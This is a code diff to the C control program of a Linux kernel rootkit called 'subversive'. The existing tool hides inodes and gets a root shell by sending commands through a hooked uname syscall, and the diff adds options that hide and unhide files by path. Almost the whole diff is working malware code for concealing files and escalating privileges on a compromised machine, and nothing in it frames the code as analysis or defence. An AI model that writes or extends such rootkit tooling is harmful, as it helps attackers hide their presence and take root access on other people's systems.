@@ -4,14 +4,19 @@
 #include <getopt.h>
 #include <unistd.h>
 #include <sys/syscall.h>
+#include <sys/stat.h>
 
 #include <subversive/subversive_ctl.h>
+
+#define warn(fmt, ...) fprintf(stderr, fmt"\n", ##__VA_ARGS__)
 
 static struct option long_options[] = {
 	{"hide-inode", 1, 0, 0},
 	{"unhide-inode", 1, 0, 1},
 	{"lulz-mode", 1, 0, 2},
 	{"root-shell", 0, 0, 3},
+	{"hide-file", 1, 0, 4},
+	{"unhide-file", 1, 0, 5},
 	{0, 0, 0, 0}
 };
 
@@ -21,7 +26,9 @@ void usage(const char *path)
 		"\t--hide-inode <inode>\thide inode\n" \
 		"\t--unhide-inode <inode>\tunhide inode\n" \
 		"\t--lulz-mode <on|off>\tactivate lulz mode\n" \
-		"\t--root-shell\t\tgive a root shell\n", path);
+		"\t--root-shell\t\tgive a root shell\n" \
+		"\t--hide-file <path>\thide file\n" \
+		"\t--unhide-file <path>\tunhide file\n", path);
 }
 
 void root_shell(void)
@@ -35,6 +42,50 @@ void root_shell(void)
 	args.mode = GET_ROOT;
 	syscall(SYS_uname, &args);
 	execve(argv[0], argv, env);
+}
+
+long get_inode(const char *path)
+{
+	struct stat st;
+
+	if (stat(path, &st) < 0)
+		return -1;
+
+	return st.st_ino;
+}
+
+void hide_file(const char *path)
+{
+	long ino;
+	struct rk_args args;
+
+	ino = get_inode(path);
+	if (ino < 0) {
+		warn("unable to hide file %s", path);
+		return;
+	}
+
+	memset(&args, 0, sizeof(args));
+	args.mode = HIDE_INODE;
+	args.param1 = ino;
+	syscall(SYS_uname, &args);
+}
+
+void unhide_file(const char *path)
+{
+	long ino;
+	struct rk_args args;
+
+	ino = get_inode(path);
+	if (ino < 0) {
+		warn("unable to unhide file");
+		return;
+	}
+
+	memset(&args, 0, sizeof(args));
+	args.mode = UNHIDE_INODE;
+	args.param1 = ino;
+	syscall(SYS_uname, &args);
 }
 
 int main(int argc, char **argv)
@@ -77,6 +128,12 @@ int main(int argc, char **argv)
 			break;
 		case 3:
 			root_shell();
+			break;
+		case 4:
+			hide_file(optarg);
+			break;
+		case 5:
+			unhide_file(optarg);
 			break;
 		default:
 			break;
